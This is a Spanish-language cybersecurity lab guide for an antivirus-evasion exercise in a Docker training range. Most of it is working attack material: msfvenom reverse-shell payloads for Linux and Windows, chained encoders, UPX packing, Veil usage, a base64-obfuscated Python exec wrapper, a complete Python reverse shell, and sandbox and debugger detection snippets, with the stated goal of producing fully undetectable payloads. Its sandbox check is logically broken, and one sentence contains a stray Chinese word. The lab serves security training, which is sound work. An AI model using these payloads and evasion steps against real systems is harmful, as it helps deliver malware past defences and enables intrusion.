# 🦸 Unit 6: Evasión de Defensas - LAB PRÁCTICO

## 📋 Requisitos Previos

### Software Requerido
- **Docker** y **Docker Compose**
- **Cliente SSH**
- **Metasploit** (incluido en Kali)
- **UPX** (incluido en Kali)

### Conocimientos Recomendados
- Cómo funcionan los antivirus
- Conceptos de ofuscación y encoding
- Tipos de firmas antivirus
- Técnicas de análisis dinámico (sandbox)

---

## 🎯 Objetivos de Aprendizaje

1. ✅ **Comprender** cómo funcionan los antivirus y detección
2. ✅ **Obfuscar** payloads para evadir detección
3. ✅ **Usar** encoders y packers
4. ✅ **Crear** payloads indetectables (FUD)
5. ✅ **Evadir** análisis estático y dinámico

---

## 🏗️ Arquitectura del Laboratorio

```
┌──────────────────────────────────────────────────────────────────┐
│                      LABORATORIO 6                                │
│                    EVASIÓN DE DEFENSAS                              │
├──────────────────────────────────────────────────────────────────┤
│   ┌─────────────┐                            ┌─────────────┐      │
│   │    KALI    │        ATAQUE              │  OBJETIVO   │      │
│   │   LINUX    │  ──────────────────────→  │   WINDOWS   │      │
│   │ (Atacante) │                            │             │      │
│   │192.168.61.2│                           │192.168.61.3│      │
│   └─────────────┘                            └─────────────┘      │
│        │                                            │              │
│        │  • msfvenom (encoding)                   │              │
│        │  • UPX (packing)                        │              │
│        │  • Veil-Evasion                        │              │
│        │  • Shellter                            │              │
│        │  • Python obfuscation                  │              │
│        │                                          │              │
│        │        HERRAMIENTAS DE DETECCIÓN:       │              │
│        │        • ClamAV                         │              │
│        │        • VirusTotal API                │              │
│        │        • Análisis estático             │              │
│        │            RED: 192.168.61.0/24        │              │
└────────┼──────────────────────────────────────────┼──────────────┘
         │
     SSH:2222
```

---

## 🚀 INSTRUCCIONES DETALLADAS

### Paso 1: Iniciar el Laboratorio

```bash
cd docker-labs/unit6
docker-compose up -d

# Ver contenedores
docker ps
```

### Paso 2: Conectar a Kali

```bash
ssh root@localhost -p 2222
# Password: toor
```

### Paso 3: Preparar Entorno

```bash
# Instalar herramientas adicionales
apt-get update
apt-get install -y upx wine binutils python3 python3-pip

# Instalar veil si no está
# git clone https://github.com/Veil-Framework/Veil.git
# cd Veil
# ./config/setup.sh --force --silent
```

---

## ⚔️ EJERCICIOS DE ATAQUE - GUÍA DETALLADA

### Ejercicio 1: Generación de Payloads - Conceptos Básicos

**Duración**: 20 minutos

**Objetivo**: Entender la generación básica de payloads y detección

#### 1.1 Generar Payload Básico

```bash
# Generar payload Linux básico
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.61.2 LPORT=4444 -f elf -o shell_basic.elf

# Generar payload Windows
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.61.2 LPORT=4444 -f exe -o shell_basic.exe
```

#### 1.2 Analizar con Herramientas de Detección

```bash
# Usar ClamAV para escanear
clamscan shell_basic.elf

# Análisis con strings
strings shell_basic.elf | head -20

# Análisis con exiftool
exiftool shell_basic.elf

# Hash del archivo
md5sum shell_basic.elf
sha256sum shell_basic.elf
```

**Resultado esperado**: El payload básico será detectado por antivirus.

---

### Ejercicio 2: Encoding de Payloads

**Duración**: 25 minutos

**Teoría**: Los encoders transforman el código para hacerlo irreconocible, pero muchos仍然 son detectados.

#### 2.1 Usar Encoder Shikata Ga Nai

```bash
# Encoder básico (1 iteración)
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.61.2 LPORT=4444 -f exe -e x86/shikata_ga_nai -o shell_encoded1.exe

# Múltiples iteraciones
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.61.2 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 10 -o shell_encoded10.exe
```

#### 2.2 Otros Encoders

```bash
# XOR
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.61.2 LPORT=4444 -f exe -e x86/xor -o shell_xor.exe

# Alpha Upper
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.61.2 LPORT=4444 -f exe -e x86/alpha_upper -o shell_alpha.exe

# Countdown
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.61.2 LPORT=4444 -f exe -e x86/countdown -o shell_countdown.exe
```

#### 2.3 Combinar Encoders

```bash
# pipeline de encoders
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.61.2 LPORT=4444 -f exe -e x86/shikata_ga_nai -e x86/xor -e x86/alpha_upper -i 5 -o shell_piped.exe
```

---

### Ejercicio 3: Packing con UPX

**Duración**: 15 minutos

**Teoría**: Los packers comprimen y cifran el ejecutable, haciendo el análisis estático más difícil.

#### 3.1 Comprimir con UPX

```bash
# Compresión básica
upx -9 -o shell_packed.elf shell_basic.elf

# Compresión máxima
upx -9 -o shell_upx_max.elf shell_basic.elf

# Verificar
ls -lh shell*.elf
file shell_packed.elf
```

#### 3.2 Desempaquetar (Análisis)

```bash
# Ver si está empacado
upx -t shell_packed.elf

# Desempaquetar
upx -d shell_packed.elf -o shell_unpacked.elf
```

---

### Ejercicio 4: Veil-Evasion

**Duración**: 30 minutos

**Teoría**: Veil genera payloads que automáticamente usan técnicas de evasión.

#### 4.1 Usar Veil

```bash
# Si está instalado
veil

# Listar payloads disponibles
list payloads

# Usar un payload
use python/shellcode_inject/virtual
generate

# Configurar payload
set LHOST 192.168.61.2
set LPORT 4444
generate

# Guardar
```

#### 4.2 Evasion con Python

```bash
# Crear payload Python ofuscado
msfvenom -p python/shell_reverse_tcp LHOST=192.168.61.2 LPORT=4444 -f raw -o shell.py

# Ofuscar manualmente
python3 -c "
import base64
code = open('shell.py').read()
encoded = base64.b64encode(code.encode()).decode()
print(f'python -c \"exec(__import__(\"base64\").b64decode(\\\"{encoded}\\\".encode()))\"')
"
```

---

### Ejercicio 5: Custom Shellcode

**Duración**: 25 minutos

**Teoría**: Crear shellcode personalizado desde cero.

#### 5.1 Generar Shellcode

```bash
# Generar shellcode raw
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.61.2 LPORT=4444 -f c

# Guardar en archivo
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.61.2 LPORT=4444 -f c -o shellcode.c
```

#### 5.2 Embedder en C

```bash
# Compilar payload C
msfvenom -p linux/x64/exec CMD="/bin/sh" -f c -o exec.c

# Compilar
gcc -o exec exec.c
```

---

### Ejercicio 6: Técnicas Avanzadas de Evasión

**Duración**: 30 minutos

#### 6.1 Polymorphic Code

Crear código que cambia pero mantiene la misma funcionalidad:

```python
# Python polymorphic
import socket,subprocess,os

# Código base - modificar Variables
def create_shell():
    s=socket.socket()
    s.connect(("192.168.61.2",4444))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])
```

#### 6.2 Anti-Analysis

```c
// Detectar debuggers
#include <windows.h>
BOOL IsDebugPresent() {
    return IsDebuggerPresent();
}
```

#### 6.3 Evasión de Sandboxes

```python
# Detectar entorno de sandbox
import platform
import os

def check_sandbox():
    # Verificar nombre de máquina
    if platform.node() in ['sandbox', 'malware', 'virtual']:
        exit()
    
    # Verificar uptime (sandboxs tienen poco uptime)
    if os.popen('systeminfo | find "System Boot"').read():
        exit()
```

---

### Ejercicio 7: Verificación de Evasión

**Duración**: 15 minutos

#### 7.1 Verificar con ClamAV

```bash
# Escanear todos los payloads
clamscan -r .

# Ver resultado
echo $?
# 0 = limpio, 1 = infectado
```

#### 7.2 Análisis Manual

```bash
# Ver cadenas sospechosas
strings shell.exe | grep -E "meterpreter|shell_reverse|WScript|Shellexecute"

# Ver llamadas al sistema
objdump -d shell.exe | grep -E "execve|system|call"

# Ver información de secciones
readelf -l shell.exe
```

#### 7.3 Hash Comparison

```bash
# Comparar con base de datos conocida
# Subir a VirusTotal (NO hacer esto con payloads reales)
# Solo para aprendizaje
```

---

## 📋 Checklist de Entrega

| # | Tarea | Completado |
|---|-------|-----------|
| 1 | Generar payload básico | ☐ |
| 2 | Detectar con ClamAV | ☐ |
| 3 | Usar encoder shikata_ga_nai | ☐ |
| 4 | Probar múltiples encoders | ☐ |
| 5 | Comprimir con UPX | ☐ |
| 6 | Crear payload Python ofuscado | ☐ |
| 7 | Compilar payload C | ☐ |
| 8 | Análisis estático de payloads | ☐ |
| 9 | Comparar detección AV | ☐ |
| 10 | Documentar técnicas usadas | ☐ |

---

## 🛑 LIMPIEZA

```bash
cd docker-labs/unit6
docker-compose down -v

# Eliminar archivos de prueba
rm -f *.elf *.exe *.c *.sh
```

---

## ✅ Próximo Laboratorio

- **Unit 7**: Seguridad ICS/OT
- Aprenderás sobre sistemas industriales y PLCs

---

## 📚 Recursos Adicionales

- [Veil-Evasion Documentation](https://github.com/Veil-Framework/Veil)
- [UPX Manual](https://upx.github.io/)
- [Antivirus Evasion - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Anti-Virus%20Evasion)
- [Metasploit Encoders](https://docs.metasploit.com/docs/using-metasploit/basics/metasploit-framework-encoders.html)
- [Code Obfuscation Techniques](https://www.sciencedirect.com/science/article/pii/S1742287616300301)